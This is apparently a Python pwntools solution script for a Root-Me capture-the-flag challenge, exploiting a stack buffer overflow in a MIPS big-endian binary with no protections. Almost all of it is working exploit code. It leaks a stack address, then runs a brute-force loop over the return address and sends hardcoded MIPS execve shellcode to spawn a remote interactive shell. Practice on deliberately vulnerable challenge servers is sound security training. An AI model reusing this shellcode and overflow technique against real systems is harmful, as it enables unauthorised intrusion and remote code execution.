from pwn import *

"""

MIPS BufferOverflow - noalsr

    Arch:     mips-32-big
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments

"""

w = remote("challenge03.root-me.org",56565)

shell = "\x28\x06\xff\xff\x3c\x0f\x2f\x2f\x35\xef\x62\x69\xaf\xaf\xff\xf4\x3c\x0e\x6e\x2f\x35\xce\x73\x68\xaf\xae\xff\xf8\xaf\xa0\xff\xfc\x27\xa4\xff\xf4\x28\x05\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"

# leak stack value
w.sendline("w"*0x14+p32(0x400114, endian='big'))
w.sendline()
w.recvuntil("name")
w.recvuntil("name")
stack = int(w.recvuntil("name")[14:18],16)

# BufferOverflow Attack with Brute Force
for i in range(0,0x100):
	print i	
	w = remote("challenge03.root-me.org",56565)
	w.sendline("w"*0x14+p32(stack-i*4, endian='big')+"\x00"*0x30+shell)
	w.interactive()

